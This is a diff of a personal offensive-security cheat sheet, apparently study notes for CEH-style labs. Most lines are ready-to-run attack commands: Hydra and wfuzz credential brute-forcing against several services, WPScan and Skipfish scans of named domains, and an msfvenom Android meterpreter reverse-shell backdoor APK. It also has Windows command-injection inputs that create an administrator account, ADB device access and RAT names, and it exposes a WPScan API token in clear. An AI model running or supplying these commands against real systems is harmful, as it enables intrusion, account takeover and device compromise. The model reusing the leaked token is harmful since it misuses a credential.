@@ -11,9 +11,22 @@ Discover
 	Windowssamba
 		enum4linux -a 192.168.18.110
 
+	Vuln scanner
+		nmap -Pn --script vuln <ip>
+		openvas o gvm
+	Web
+		whatweb -v refal-edu.org --log-verbose Report
+		Sqliscanner
+			python3 dsss.py -u "http://testphp.vulnweb.com/artists.php?artist=1"
+
 hydra
 	hydra -l <user> -P <rockyou.txt>  ftp://thm.thm  -s <10021 port>
-	hydra -l <user> -P <rockyou.txt> -f -v thm http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
+	hydra -l <user> -P <rockyou.txt> -f -v thm http-post-form "/login.php:login_username=milesdyson&secretkey=^PASS^:Access 
+	denied" -s 8000
+	hydra -l milesdyson -P  logs\\log1.txt -f -v 10.10.102.24 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:Unknown user or password incorrect." -t50 
+	SMB
+	hydra -l user -P /root/Desktop/pass.txt 192.168.1.118 smb
+
 
 jtr
 	john --format=raw-md5 --wordlist=<rockyou.txt> hash.txt
@@ -40,6 +53,8 @@ Web server
 		-Tuning(File Upload, Misconfigurations / Default Files, Information Disclosure, Injection, Command Execution, SQL Injection)
 	Skipfish 
 		skipfish -o /home/directory -S /usr/share/skipfish/dictionaries/complete.wl http://xaferima.com
+		sudo skipfish -o test2 http://xaferima.com
+
 	nmap -sV --script=http-enum site.com  (page 1245)
 	uniscan -u url -q(directories) -we(map, robots,siemap) -d(dynamic:emails,sourcecode,etc)
 
@@ -49,6 +64,10 @@ WPSCAN
 		--enumerate vp (Vulns Plugins)
 	wpscan --url http://refal-edu.org/ --passwords /home/xaferima/Documents/payloads/rockyou.txt --usernames xaferima
 		--plugins-detection aggressive
+	mesfconsole auxiliary/scanner/http/wordpress_login_enum
+
+	wpscan --url http://cmnatics.playground/ --enumerate u,p,t,vp  (total)
+		--api-token s2d8g0sJsPoVPCaaZa1tnapaM7YKPaOf9w71gkB55M4
 
 SQLMAP 
     Simple usage sqlmap -u “https://target_site.com/page/”
@@ -78,9 +97,23 @@ SQLMAP
         T: Time-based blind
         Q: Inline queries
 
+Command injection Windows
+	hostname
+	whoami
+	tasklist
+	Taskkill /PID 3112 /F   //forcefully kills the processes
+	dir c:\
+	net user
+	net user test /add     //add a new user
+	net localgroup Administrators test /add    //add test user to administrators
+	net user test     //to view the details of the user
+	dir c:\ "pin.txt" or this command ! Take pin.txt
+	| type c:\"pin.txt"
+
 
 samba 445
 	smbclient //192.168.0.X/name -U USER%password
+	smbclient \\\\blog.thm\\anonymous   ******
 	smbclient -U 'user' \\\\<ip>\\Administrator 
 	nmap -T4 -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 48.21.33.124
 	medusa -M smbnt -v 4 -b -h srv01.acme.com -U smb-users.txt -P rockyou.txt
@@ -97,7 +130,7 @@ Fuzz credentials post
 	wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://yhm/login.php -d "username=FUZZ&password=FUZ2Z"
 
 Gobuster fuzz
-	gobuster dir -u http://thm -w /usr/share/wordlists/
+	gobuster dir -u http://thm -w /usr/share/wordlists/ -t 50
 	https://sohvaxus.github.io/content/gobuster.html
 	Wordlist
 	/usr/share/wordlists/dirbuster/directory-list-2.3-*.txt
@@ -175,14 +208,14 @@ Wifi
  		wifiphisher for wep
  	fern-wifi crack
  		wpa -wep
-Mobile
+Mobile BUscar el port 5555
 	metasploit
 		msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik -LHost=IP R >Backdoor.apk (Pasar a android)
 		use exploit/multi/handler
 		set payload android/meterpreter/reverse_tcp
 		set options -> exploit -j -z
 		run app
-	ADB and phonesploit
+	Phonesploit
 		apt-get install adb
 		git clone https://github.com/prbhtkumr/PhoneSploit
 		cd PhoneSploit
@@ -193,6 +226,18 @@ Mobile
 		Opt 4(Access shell)
 		use phone in shell mode(ce sdcard)
 		Opt 15(Run an app)
+
+	ADB	
+		adb devices 
+		adb connect ip:PORT
+		adb shell
+
+ 		adb shell find / -name *maps*
+		adb pull sdcard/log.txt
+
+IoT
+	MQTT 1883
+
 Covert channels
 	wget https://raw.githubusercontent.com/cudeso/security-tools/master/networktools/covert/covert_tcp.c
 	sudo apt install gcc
@@ -203,22 +248,28 @@ Covert channels
 
 njrat
 	open njrat on windows
+	Others
+		Mosucker,ProRat,Theef,http rat
 
 Malware analysis
-	*detect it easy el mejor
+	*detect it easy el mejor(y for entropy)
 		wget https://github.com/horsicq/DIE-engine/releases/download/3.08/Detect_It_Easy-3.08-x86_64.AppImage
 chmod +x Detect_It_Easy-3.08-x86_64.AppImage
 		./Detect_It_Easy-3.08-x86_64.AppImage 
-	1. Perform Malware Scanning using Hybrid Analysis
+	1. Perform Malware Scanning using Hybrid Analysis (tmb entropy)
 		https://www.hybrid-analysis.com/ Or virus total
 	2. Perform Strings Search using BinText
 
+Owasp ZAP
+	https://asafsahar25.medium.com/testing-for-sql-injection-vulnerabilities-using-owasp-zap-62488b5805f0
 
 Muy Utiles
 https://github.com/dhabaleshwar/CEHPractical/blob/main/Everything%20You%20Need.md
 Secret.txt lab 2 task 2 
 Covert channels task 6 185p(678)
 Cain & abel>sniffin page 900(4329)
+Detodo 
+https://renewstech.blogspot.com/
 
 
 Otros 
@@ -231,3 +282,23 @@ Enumeration windows:
 https://ceh-practical.cavementech.com/module-4.-enumeration/1.-netbios-enumeration-port-137
 Privilage escalation:
 https://ceh-practical.cavementech.com/module-6.-system-hacking/2.-privilege-escalation
+Openvas-gvm
+https://cyberlab.pacific.edu/courses/comp178/labs/lab-4-vulnerability-scanning
+
+
+
+
+# SSH
+hydra -l username -P passlist.txt 192.168.0.100 ssh
+  
+ # FTP
+hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100
+ 
+# If the service isn't running on the default port, use -s
+ hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221
+  
+# TELNET
+hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet
+
+# Login form
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"  
